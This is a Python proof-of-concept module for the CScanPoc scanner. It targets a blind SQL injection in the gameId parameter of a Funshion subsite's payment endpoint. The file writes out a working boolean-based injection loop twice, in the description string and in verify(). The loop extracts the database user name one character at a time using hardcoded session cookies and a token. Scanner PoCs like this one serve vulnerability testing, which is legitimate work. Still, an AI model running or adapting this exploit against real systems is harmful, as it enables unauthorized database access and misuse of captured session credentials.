# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'ibidian_0101' # 平台漏洞编号
    name = '风行旗下分站SQL注入' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''模版漏洞描述
    风行旗下分站SQL注入
    url= self.target + '/pay/pay/get_server_list'
    cookie='login_start=1; user_id=cO5txlA6%2FB1rAAq7YXVGXg%3D%3D; user_name=wooyun; nickname=wooyun; user_icon=http%3A%2F%2Fimg.funshion.com%2Fimg%2Fdefault%2Fhead_s_m.jpg; ads_id=1; page_id=1; cookie_timeout=0; token=JM0lbOGuGr9b7rifs51kqqOY9TJ2br_z_mG-glStU_eDUdX4YBAM7xoSFrYQoGsOcLK4Coke14FATjDcImGVazVEJJP9bceszW5Rltw4NK8; encrypted=cO5txlA6%2FB1rAAq7YXVGXg%3D%3D'
    user_agent='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36'
    payloads='abcdefghijklmnopqrstuvwxyz._@ 0123456789'
    headers={'Cookie':cookie,'User-Agent':user_agent}
            for i in range(1,27):
                for p in payloads:
                    gameid='165 and if(ascii(substr(user(),{},1))={},1,0)'.format(i,ord(p))
                    data={'gameId':gameid,'cache':'1451107818'}
                    req=requests.post(url,data=data,headers=headers)
                    if len(req.text)>1000:
                        user=user+p
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
                        break
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=164927
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ibidian'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6fbc0b9f-27a6-4254-9381-a63ed700b3da' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-09' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url= self.target + '/pay/pay/get_server_list'
            cookie='login_start=1; user_id=cO5txlA6%2FB1rAAq7YXVGXg%3D%3D; user_name=wooyun; nickname=wooyun; user_icon=http%3A%2F%2Fimg.funshion.com%2Fimg%2Fdefault%2Fhead_s_m.jpg; ads_id=1; page_id=1; cookie_timeout=0; token=JM0lbOGuGr9b7rifs51kqqOY9TJ2br_z_mG-glStU_eDUdX4YBAM7xoSFrYQoGsOcLK4Coke14FATjDcImGVazVEJJP9bceszW5Rltw4NK8; encrypted=cO5txlA6%2FB1rAAq7YXVGXg%3D%3D'
            user_agent='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36'
            payloads='abcdefghijklmnopqrstuvwxyz._@ 0123456789'
            user=''
            headers={'Cookie':cookie,'User-Agent':user_agent}
            for i in range(1,27):
                for p in payloads:
                    gameid='165 and if(ascii(substr(user(),{},1))={},1,0)'.format(i,ord(p))
                    data={'gameId':gameid,'cache':'1451107818'}
                    req=requests.post(url,data=data,headers=headers)
                    if len(req.text)>1000:
                        user=user+p
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
                        break
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
